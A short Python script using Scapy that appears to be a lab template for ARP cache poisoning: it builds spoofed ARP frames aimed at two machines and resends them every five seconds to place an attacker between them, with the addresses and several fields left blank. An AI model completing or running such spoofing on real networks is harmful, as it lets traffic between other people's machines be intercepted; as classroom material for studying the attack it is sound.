#!/usr/bin/python3
from scapy.all import *
from time import  *


# Machine A's informaton
IP_A  = ""
MAC_A = ""

# Machine B's informaton
IP_B  = ""
MAC_B = ""

# Attacker Machine's informaton
IP_M  = ""
MAC_M = ""


print("SENDING SPOOFED ARP REPLY.........")

# Construct spoofed ARP sent to machine A
ether1     = Ether()
ether1.dst = MAC_A
arp1       = ARP()
arp1.psrc  = 
arp1.hwsrc = 
arp1.pdst  = 
arp1.op    = 1 
frame1     = ether1/arp1


# Construct spoofed ARP sent to machine B
ether2      = Ether()
ether2.dst  = MAC_B
arp2        = ARP()
arp2.psrc   = 
arp2.hwsrc  = 
arp2.pdst   = 
arp2.op     = 1 
frame2      = ether2/arp2


while 1:
   sendp(frame1) 
   sendp(frame2) 
   sleep(5)
